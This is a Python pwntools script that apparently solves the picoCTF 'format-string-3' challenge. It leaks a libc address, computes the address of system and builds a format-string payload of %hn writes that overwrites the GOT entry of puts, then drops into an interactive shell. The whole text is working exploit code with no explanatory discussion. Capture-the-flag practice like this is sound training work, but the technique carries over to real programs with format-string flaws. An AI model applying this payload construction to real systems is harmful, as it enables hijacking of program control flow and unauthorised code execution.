from pwn import *

# local or remote
r = process('./format-string-3')
#r = remote('rhea.picoctf.net', '57026')

# setvbuf address
r.recvuntil(b'libc: 0x')
setvbuf_addr = int(r.recvline().strip(), 16)

# system address
system_addr = setvbuf_addr + 0x4f760 - 0x7a3f0
system = p64(system_addr, endian='big')
system_p1 = int.from_bytes(system[6:8])
system_p2 = int.from_bytes(system[4:6])
system_p3 = int.from_bytes(system[2:4])
system_p4 = int.from_bytes(system[0:2])

# puts address in GOT
got_puts = 0x404018
got_puts_p1 = p64(got_puts)
got_puts_p2 = p64(got_puts+2)
got_puts_p3 = p64(got_puts+4)
got_puts_p4 = p64(got_puts+6)

# system-puts dict
system_puts = {
        system_p1: got_puts_p1,
        system_p2: got_puts_p2,
        system_p3: got_puts_p3,
        system_p4: got_puts_p4,
}
system_puts_sorted = dict(sorted(system_puts.items()))

# payload prepare
payload_start = b''
payload_end = b''
last = 0
more = 0
for k, v in system_puts_sorted.items():
    diff = k - last
    last = k
    if diff == 0:
        payload_start += b'%%%%%s$hn' % b'%d'
        more += 1
    else:
        payload_start += b'%%%%%dc%%%%%s$hn' % (diff, b'%d')
        more += 2

    payload_end += v

# payload padding and offset
payload_offset = 38
padding = 8 - (len(payload_start)-more) % 8
payload_offset += (len(payload_start) + padding - more) / 8
payload_offset = int(payload_offset)

# payload ready
payload = payload_start + b'\x00'*padding + payload_end
payload = payload % (payload_offset, payload_offset+1, payload_offset+2, payload_offset+3)
print(payload)

# send payload
r.sendline(payload)

r.interactive()
